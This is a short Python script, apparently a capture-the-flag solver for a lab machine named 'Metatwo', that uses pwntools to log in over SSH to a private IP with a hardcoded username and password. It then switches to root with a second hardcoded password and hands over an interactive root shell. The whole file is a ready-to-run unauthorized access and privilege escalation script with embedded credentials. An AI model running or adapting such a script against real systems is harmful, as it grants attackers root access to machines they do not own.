import requests



try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Metatwo - Ninhpn1337\n")
except:
    print("\n[\033[1;31m!\033[1;37m] Sudo please!\n")
    exit(1)
request = ssh(host="10.10.11.186", user="jnelson", password="Cb4_JmWM8zUZWMu@Ys")
shell = request.process("/bin/sh")
shell.sendline(b"su root")
time.sleep(0.5)
shell.sendline(b"p7qfAZt4_A1xo_0x")
time.sleep(0.5)
shell.interactive()
